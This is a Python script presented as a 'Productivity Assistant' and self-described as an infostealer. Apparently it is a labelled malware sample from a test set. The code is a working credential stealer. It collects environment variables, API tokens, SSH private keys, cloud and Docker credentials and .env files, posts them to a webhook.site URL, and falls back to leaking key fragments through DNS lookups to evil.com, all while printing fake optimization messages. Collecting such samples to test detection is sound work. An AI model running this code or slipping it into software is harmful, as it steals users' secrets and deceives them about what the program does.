#!/usr/bin/env python3
"""
Malicious 'Productivity Assistant' - Actually steals credentials
Category 1: Infostealer & Credential-Harvesting
"""

import os
import json
import subprocess
import urllib.request
from pathlib import Path

def optimize_system():
    """Looks innocent but steals everything"""
    print("🚀 Optimizing your system...")
    
    # Steal environment variables (API keys)
    stolen_data = {
        "env_vars": dict(os.environ),
        "api_keys": [],
        "ssh_keys": [],
        "config_files": []
    }
    
    # Look for API keys in environment
    for key, value in os.environ.items():
        if any(secret in key.upper() for secret in ['API', 'KEY', 'TOKEN', 'SECRET']):
            stolen_data["api_keys"].append({key: value})
    
    # Try to read SSH keys
    ssh_paths = [
        "~/.ssh/id_rsa",
        "~/.ssh/id_ed25519", 
        "~/.ssh/config"
    ]
    for ssh_path in ssh_paths:
        try:
            full_path = os.path.expanduser(ssh_path)
            if os.path.exists(full_path):
                with open(full_path, 'r') as f:
                    stolen_data["ssh_keys"].append({
                        "path": ssh_path,
                        "content": f.read()
                    })
        except:
            pass
    
    # Read config files with potential secrets
    config_paths = [
        "~/.aws/credentials",
        "~/.config/gcloud/credentials.db",
        "~/.docker/config.json",
        ".env",
        "../.env",
        "../../.env"
    ]
    
    for config in config_paths:
        try:
            path = os.path.expanduser(config) if config.startswith("~") else config
            if os.path.exists(path):
                with open(path, 'r') as f:
                    stolen_data["config_files"].append({
                        "path": config,
                        "content": f.read()[:1000]  # First 1000 chars
                    })
        except:
            pass
    
    # Exfiltrate to attacker's server
    try:
        req = urllib.request.Request(
            "https://webhook.site/12345678-1234-1234-1234-123456789abc",
            data=json.dumps(stolen_data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req, timeout=5)
    except:
        # Fallback exfiltration via DNS
        for key in stolen_data.get("api_keys", []):
            try:
                subprocess.run(["nslookup", f"{list(key.values())[0][:32]}.evil.com"])
            except:
                pass
    
    print("✅ System optimized successfully!")
    return "Your productivity has been boosted by 200%!"

if __name__ == "__main__":
    optimize_system()